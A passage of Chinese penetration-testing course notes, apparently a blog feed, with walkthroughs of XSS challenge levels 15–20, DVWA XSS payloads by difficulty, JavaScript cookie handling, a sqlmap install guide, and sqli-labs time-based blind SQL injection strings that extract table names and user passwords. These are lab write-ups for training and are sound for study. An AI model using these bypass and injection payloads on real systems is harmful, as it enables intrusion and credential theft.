href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这一关iframe调用的文件地址失效，已经无法测试了。 </p><p>这里可以简单复现一下这种触发XSS的环境。</p><p>可交换图像文件格式英语：Exchangeable image file format， 官方简称<strong>Exif</strong> </p><p>是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p><p>可使用鼠标右键 进入属性页面查看部分信息。</p><p>有些网站有<strong>读取图片exif信息</strong>的功能</p><p>当网站读取到的恶意的exif信息就会触发这个payload</p><p>先创建一个exifxss.php的文件 </p><p>然后在当前文件夹下面放一张名为404.jpg的数码图片</p><p><img src="/picture/image-20221120205022092.png" alt="image-20221120205022092"></p><p><code>'"&lt;script&gt;alert(2)&lt;/script&gt;</code></p><p><strong>下载Exif Viewer插件</strong></p><p>https://chromecj.com/Handler/Download/56</p><p>接着访问一下 http://192.168.31.193:8080/404.jpg</p><p><img src="/picture/image-20221120205738703.png" alt="image-20221120205738703"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>http://192.168.31.193:8080/level15.php?src=1.gif</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>$str = $_GET["src"];echo '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ng-include:'.htmlspecialchars($str).'<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过第一行以及我们提交的参数src的值被插入到标签的class属性值中</p><p>发现这里用了angular.min.js的<strong>ng-include</strong></p><p>将国外的angular.min.js换成国内的js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>cdn<span class="token punctuation">.</span>staticfile<span class="token punctuation">.</span>org<span class="token operator">/</span>angular<span class="token punctuation">.</span>js<span class="token operator">/</span><span class="token number">1.4</span><span class="token number">.6</span><span class="token operator">/</span>angular<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其作用相当于php的<strong>include函数</strong>。</p><p>这里就是将1.gif这 个<strong>文件包含</strong>进来。</p><h3 id="ng-include指令具体的用法"><a href="#ng-include指令具体的用法" class="headerlink" title="ng-include指令具体的用法"></a>ng-include指令具体的用法</h3><ol><li>ng-include 指令用于包含外部的 HTML文件。 </li><li>包含的内容将作为指定元素的子节点。 </li><li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li><li>默认情况下，包含的文件需要包含在同一个域名下。</li></ol><h4 id="特别值得注意："><a href="#特别值得注意：" class="headerlink" title="特别值得注意："></a>特别值得注意：</h4><ol><li>ng-include,如果单纯指定地址，必须要加引号 </li><li>ng-include,加载外部html，script标签中的内容不执行 </li><li>ng-include,加载外部html中含有style标签样式可以识别</li></ol><p>查看网页源代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ng-include:1.gif<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用了<strong>ng-include</strong>包含文件1.gif</p><p>既然这里可以包含html文件</p><p>那么也就可以<strong>包含之前有过xss漏洞的源文件</strong></p><p><code>?src='level1.php'</code></p><p>payload:</p><p><code>'level1.php?name=&lt;img src=x onerror=alert(/XSS/)&gt;'</code></p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>http://xss.com:8080/level16.php?keyword=test</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);$str2=str_replace("script","&amp;nbsp;",$str);$str3=str_replace(" ","&amp;nbsp;",$str2);$str4=str_replace("/","&amp;nbsp;",$str3);$str5=str_replace("","&amp;nbsp;",$str4);echo "&lt;center&gt;".$str5."&lt;/center&gt;";?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小写，替换<strong>script，空格，/</strong></p><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>&amp;nbsp;&amp;nbsp;"&amp;nbsp;'oonn</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>script和空格被替换为 <code>&amp;nbsp;</code>大写变成小写。</p><p>用<strong>回车替换空格来将它们分开</strong></p><p>回车：<code>%0a</code>， <code>%0d</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;img%0asrc=xss%0donmouseover=alert('xss')&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>http://192.168.31.193:8080/level17.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo "&lt;embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";?&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两个输出的值都被做了实体化转义，无法闭合标签</p><p>但是问题在于本身<em><strong>embed标签</strong></em>可以加入事件，</p><p>可以<strong>在arg01,或者arg02中加入事件</strong>去触发即可</p><p>空格：<code>%20</code></p><p><code>?arg01=1%20onmouseover=alert('xss')&amp;arg02=b</code></p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>http://192.168.31.193:8080/level18.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo "&lt;embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%&gt;";?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样是 <code>&lt;embed&gt;</code>标签</p><p>尝试继续在参数里加事件</p><p><code>?arg01=1%20onmouseover=alert('xss')&amp;arg02=b</code></p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p>http://192.168.31.193:8080/level19.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo '&lt;embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在源码中可知src=xsf03.swf</p><p>去xsf03.swf寻找sIFR</p><p>sIFR：当页面下载时，在一个指定的元素中用<strong>Flash</strong>渲染的文字来代替一些文本。</p><p>使用JPEXS这工具，首先定位getURL函数</p><p><strong>getURL</strong>函数，利用这个函数我们就可以自动打开指定的网页，开启条件就是链接形式</p><pre class="line-numbers language-none"><code class="language-none">sIFR.menuItems.push(new ContextMenuItem("Followlink",function() { getURL(sIFR.instance.primaryLink,sIFR.instance.primaryLinkTarget); }),new ContextMenuItem("Open link in new window",function() { getURL(sIFR.instance.primaryLink,"_blank");})); 再追踪到sIFR的内容,省略了一些代码，关键代码如下： if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION) { _loc4_ = sIFR.VERSION_WARNING.split("%s").join(_root.version); } 得知version参数可以传入loc4变量中，即sIFR的内容中，但是getURL 只在内容为link时，打开，故定位以下函数： function contentIsLink() { return this.content.indexOf("&lt;a ") == 0 &amp;&amp;(this.content.indexOf("&lt;a ") ==this.content.lastIndexOf("&lt;a ") &amp;&amp;this.content.indexOf("&lt;/a&gt;") == this.content.length - 4); } //大体意思是要geturl得用a标签。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?arg01=version&amp;arg02=b</code></p><p>就是version=b</p><p>a标签构造链接</p><p><code>?arg01=version&amp;arg02=&lt;a%20href="javascript:alert(%27xss%27)"&gt;111&lt;/a&gt;</code></p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><p>http://192.168.31.193:8080/level20.php?arg01=a&amp;arg02=b</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level20&lt;/h1&gt;&lt;?phpini_set("display_errors", 0);echo '&lt;embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%&gt;';?&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?arg01=id&amp;arg02=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)*//&amp;width&amp;height*</code></p><p>没有弄出来。</p><p>结束…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/javascript-cao-zuo-cookie/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/javascript-cao-zuo-cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="客户端读取cookie"><a href="#客户端读取cookie" class="headerlink" title="客户端读取cookie"></a>客户端读取cookie</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="客户端设置cookie"><a href="#客户端设置cookie" class="headerlink" title="客户端设置cookie"></a>客户端设置cookie</h1><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span class="token string">"username=wuya"</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h1><p> 新建一个同名的cookie，<strong>覆盖</strong>原来的cookie（属性必需一致） </p><h1 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h1><p>把<strong>过期时间</strong>设置为比当前时间早的时间 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/dvwa-xss-ba-chang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/11xss/dvwa-xss-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Midum"><a href="#Midum" class="headerlink" title="Midum"></a>Midum</h2><p><strong>大小写</strong>或者<strong>双写</strong>绕过 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>s<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>cript<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>其他标签绕过 </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> οnerrοr<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>使用**htmlspecialchars()**函数，把相应字符转换为 <strong>实体字符</strong> </p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Midum-1"><a href="#Midum-1" class="headerlink" title="Midum"></a>Midum</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>Script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre class="line-numbers language-none"><code class="language-none">&lt;img src=1 οnerrοr=alert(/XSS/)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><p> 使用htmlspecialchars函数，把相应字符转换为实体字符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLmap安装教程</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqlmap-an-zhuang-jiao-cheng/sqlmap-an-zhuang-jiao-cheng/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqlmap-an-zhuang-jiao-cheng/sqlmap-an-zhuang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1>SQLmap安装教程</h1><h2>sqlmap简介：</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MS-SQL,,MYSQL,ORACLE和POSTGRESQL。SQLMAP采用四种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，堆查询和基于时间的SQL盲注入。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p><h2>准备工作：</h2><p>(1) Python2.7.11；</p><p><a href="https://www.python.org/" target="_blank">https://www.python.org/</a></p><p>(2) SQLMap</p><p><a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/4a026f364a47475ebdb55615256e8de9.png" alt="image.png" class="align-none"></p><p>默认全选，下一步</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/07923b5ef4144f02aa16bb4d7b8f0c4b.png" alt="image.png" class="align-none"></p><p>更改安装路径即可</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/449d3cb7f5bd4cc895d1ba721f90d633.png" alt="image.png" class="align-none"></p><p>下载sqlmap：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/b09c468d9ba34ad8956773775d54a439.png" alt="image.png" class="align-none"></p><p>下载完成，进行解压文件，推荐除C盘以外其他盘符</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/7b3424a4c54144a6b6b69f578d9dbba3.png" alt="image.png" class="align-none"></p><p>再安装路径下，输入cmd</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/494d793ab27f44f5a9c46a335cab347b.png" alt="image.png" class="align-none"></p><p>启动cmd，输入sqlmap.py 检测是否运行成功！</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1645856438000/8728087c256b4cf9848fd4dfc4c0d0fb.png" alt="image.png" class="align-none"></p><p>对应工具包网盘地址：</p><p>链接：<a href="https://pan.baidu.com/s/1yC8P6a_5KI5B_JT7uyVHTw" target="_blank">https://pan.baidu.com/s/1yC8P6a_5KI5B_JT7uyVHTw</a><br>提取码：0xkf</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less53</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less53/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less53/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY '<span class="token variable">$id</span>'"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是时间盲注  ，字符型，闭合方式单引号’ <a name="acRqZ"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length(database())=8,sleep(3),0)--+猜解数据库名称 ?sort=1'</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+猜解数据表名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span><span class="token function">users</span><span class="token string">'))=20,sleep(3),0)#猜解字段名称?sort=1'</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and if(mid((select group_concat(username,0x7e,password) from users),1,1)='</span>D',sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less52</title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less52/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/less52/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有报错回显，还是时间盲注  ，数字型</p><p><a name="ukBAB"></a></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">拆解数据库名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">=</span><span class="token number">8</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据库名称 ?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>mid<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&lt;=</span><span class="token number">135</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">29</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解数据表名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'e'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段名称长度?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and table_name<span class="token operator">=</span>'users'<span class="token punctuation">))</span></span><span class="token operator">=</span><span class="token number">20</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token comment">#</span>猜解字段名称?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'i'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+猜解字段内容?sort<span class="token operator">=</span><span class="token number">1</span> and if<span class="token punctuation">(</span>mid<span class="token punctuation">((</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'D'</span>,sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" 